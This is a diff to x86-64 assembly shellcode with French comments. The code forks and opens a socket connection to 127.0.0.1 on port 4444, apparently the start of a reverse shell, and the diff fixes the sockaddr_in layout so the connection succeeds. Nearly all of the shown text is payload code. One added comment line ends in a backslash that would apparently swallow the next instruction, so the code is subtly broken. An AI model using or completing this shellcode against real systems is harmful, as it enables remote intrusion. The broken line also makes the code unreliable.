@@ -1,8 +1,9 @@
 
 BITS 64
 
+global _start
 _start:
-    ; ===== fork() ===== crée deux copies du programme 
+    ; ===== fork() ===== crée deux copies du programme\
     xor     rax, rax
     mov     al, 57              ; syscall fork = 57
     syscall
@@ -28,9 +29,9 @@ _start:
     ; connect(sockfd, {AF_INET, PORT, IP}, 16)
     xor     rax, rax
     push    rax             ; padding (8 octets à 0)
+    mov     word  [rsp],   0x0002      ; AF_INET = 2 (IPv4)
+    mov     word  [rsp+2], 0x5C11      ; port 4444 en big-endian
     mov     dword [rsp+4], 0x0100007f  ; IP 127.0.0.1 en little-endian
-    mov     word  [rsp+6],  0x5C11     ; port 4444 en big-endian
-    mov     word  [rsp+8],  0x0002     ; AF_INET = 2 (IPv4)
     mov     rsi, rsp        ; rsi = pointeur vers sockaddr_in
     mov     rax, 42         ; syscall connect = 42
     mov     rdi, r12        ; sockfd
